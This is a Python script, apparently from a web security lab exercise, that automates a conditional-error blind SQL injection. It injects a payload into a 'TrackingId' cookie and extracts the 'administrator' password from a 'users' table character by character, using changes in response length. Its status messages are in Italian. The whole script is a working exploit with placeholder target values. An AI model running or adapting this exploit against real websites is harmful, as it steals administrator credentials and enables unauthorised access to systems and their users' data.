import requests
import time


url = 'URL'


headers = {
    'User-Agent': 'USERAGENT',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}
password_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
          

def find_password(url, headers):
    start_time = time.time()
    result = []  
    session = requests.Session()  

    for param in range(1, 21):  
        for value in password_chars:
            
            cookie_value = f"COOKIE' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, {param}, 1) = '{value}') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE ROWNUM = 1) IS NULL --;"
            cookies = {'TrackingId': cookie_value}

           
            response = session.get(url, headers=headers, cookies=cookies)
            length = len(response.content)
            print(length)            
            if length != 11348:
                result.append(value)
                print(f"[+] Carattere trovato: {value} → Password parziale: {''.join(result)}")
                break  
    end_time = time.time()
    execution_time = end_time - start_time  
    print(f"\n[!] Tempo di esecuzione: {execution_time:.4f} secondi")            
    return ''.join(result) 


password = find_password(url, headers)
print(f"\n[!] Password trovata: {password}")
